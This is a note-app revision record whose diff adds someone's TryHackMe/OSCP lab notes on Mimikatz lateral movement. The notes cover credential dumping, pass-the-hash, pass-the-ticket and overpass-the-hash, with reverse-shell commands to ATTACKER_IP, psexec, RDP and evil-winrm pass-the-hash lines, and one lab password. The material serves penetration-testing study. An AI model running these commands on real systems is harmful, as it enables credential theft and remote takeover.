id: 44eb487a88fb491790c2e7c31a60df4a
parent_id: b91b954699f2456f93b8e669cb1c0953
item_type: 1
item_id: 7a17f0881b6947d484027650987381ef
item_updated_time: 1657641666625
title_diff: "[]"
body_diff: "[{\"diffs\":[[1,\"**\"],[0,\"Mimikatz\"],[1,\"**\"],[0,\" is \"]],\"start1\":0,\"start2\":0,\"length1\":12,\"length2\":16},{\"diffs\":[[0,\"cenario.\"],[-1,\"\\\n\\\n\"],[1,\" Can use other similar methods, but all commands are related to usage with Mimikatz.\\\n\\\n# \"],[0,\"NTLM\\\n\\\n![\"]],\"start1\":39,\"start2\":39,\"length1\":18,\"length2\":104},{\"diffs\":[[0,\"ileges (\"],[1,\"2 commands)\"],[0,\"\\\n\\\n> seku\"]],\"start1\":494,\"start2\":494,\"length1\":16,\"length2\":27},{\"diffs\":[[0,\"sa::\"],[-1,\"logonpasswords\"],[1,\"msv # according to TryHackMe\\\n> \\\n> sekurlsa::logonpasswords #according to PWK\\\n\\\n## Use hash to perform PtH attack\\\n\\\n> token::revert\\\n> \\\n> `sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:\\\"c:\\\\tools\\\\\nc64.exe -e cmd.exe ATTACKER_IP 5555\\\"`\\\n\\\n![e5f1bb9f0fbfd1448a04713bb1e46e30.png](:/e4103fd2779647deb99e43f6811222b0)\\\n\\\nWe can open a reverse shell before actually calling the PtH command\\\n\\\nInterestingly, if you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH.\\\n\\\n## Other Ways to Pass-the-Hash (in Kali Linux if you have access to the machine)\\\n\\\n### RDP\\\n\\\n`xfreerdp /v:VICTIM_IP /u:DOMAIN\\\\\\\\MyUser /pth:NTLM_HASH`\\\n\\\n### PsExec (Python, impacket script)\\\n\\\n`psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`\\\n\\\nimpacket-psexec oscp.exam/ketty.agan:ESMWaterP1p3S\\\\\\\\!@ms01.oscp.exam\\\n\\\n### WinRM (Evil-winrm)\\\n\\\n`evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`\\\n\\\n# Kerberos Auth (Pass-the-ticket)\\\n\\\nkrbtgt\\\n\\\n![d200068da85ba3b43481d4a65fac6954.png](:/1857cc52ba2a42b58efd49fe27d1bae4)\\\n\\\n![ac34f8b460f188e227a950343065f62b.png](:/06739fcd490d47098409a4b737f279cf)\\\n\\\n![08f7b99a327d97a11aaca24fdfea9f18.png](:/a96459342e624cc9931f27cceb33dae3)\\\n\\\n# Pass-The-Ticket\\\n\\\n> privilege::debug\\\n> \\\n> sekurlsa::tickets /export\\\n> \\\n> kerberos::ptt &lt;Ticket&gt;\\\n\\\nTo check if the tickets were correctly injected, use **klist**\\\n\\\n![154c29daef5aa89ff7c52dcfd09fede6.png](:/53adc8334b9745afa8a708c98ca083e3)\\\n\\\n# Overpass-the-hash / Pass-the-Key\\\n\\\nSimilar to PtH but in the context of Kerberos\\\n\\\nWhen a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. \\\n\\\n- If we have the key, we can ask the KDC for TGT without requiring the actual password (therefore, PtK)\\\n\\\n### Obtain Encryption Keys\\\n\\\n> privilege::debug\\\n> \\\n> sekurlsa::ekeys\\\n\\\n## Pass-the-Key based on encryption\\\n\\\n### RC4\\\n\\\n`sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:\\\"c:\\\\tools\\\\\nc64.exe -e cmd.exe ATTACKER_IP 5556`\\\n\\\n### AES128\\\n\\\n`sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:\\\"c:\\\\tools\\\\\nc64.exe -e cmd.exe ATTACKER_IP 5556\\\"`\\\n\\\n### AES256\\\n\\\n`sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:\\\"c:\\\\tools\\\\\nc64.exe -e cmd.exe ATTACKER_IP 5556\\\"`\\\n\\\nRemember to run a reverse shell to obtain the shell on Kali; Have to modify the command parameter to be able to get the reverse shell execution\"]],\"start1\":523,\"start2\":523,\"length1\":18,\"length2\":2643}]"
metadata_diff: {"new":{},"deleted":[]}
encryption_cipher_text: 
encryption_applied: 0
updated_time: 2022-07-12T16:03:19.373Z
created_time: 2022-07-12T16:03:19.373Z
type_: 13